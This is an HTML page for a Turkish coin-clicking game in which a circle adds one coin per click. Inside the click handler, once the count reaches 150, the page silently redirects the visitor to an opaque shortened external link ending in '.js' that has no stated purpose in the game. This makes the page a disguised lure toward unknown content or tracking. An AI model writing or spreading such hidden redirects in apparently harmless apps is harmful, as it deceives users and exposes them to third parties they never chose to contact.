<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coin Tıklama Oyunu</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: #f0f8ff;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .circle {
            width: 100px;
            height: 100px;
            background-color: #007bff;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 1.5rem;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            transition: transform 0.2s, background-color 0.2s;
        }
        .circle:hover {
            background-color: #0056b3;
            transform: scale(1.1);
        }
        .coin-display {
            font-size: 2rem;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <h1>Coin Tıklama Oyunu</h1>
    <div class="coin-display">Toplam Coin: <span id="coinCount">0</span></div>
    <div class="circle" id="circleButton">Tıkla!</div>

    <script>
        let coinCount = 0;

        const circleButton = document.getElementById('circleButton');
        const coinDisplay = document.getElementById('coinCount');

        circleButton.addEventListener('click', () => {
            coinCount++;
            coinDisplay.textContent = coinCount;

            // Eğer 150 coine ulaşıldıysa, yönlendirme yap
            if (coinCount === 150) {
                window.location.href = "https://2no.co/RNETy4.js";
            }

            // Animasyon efektleri (geçici büyüme)
            circleButton.style.transform = 'scale(1.2)';
            setTimeout(() => {
                circleButton.style.transform = 'scale(1)';
            }, 100);
        });
    </script>
</body>
</html>
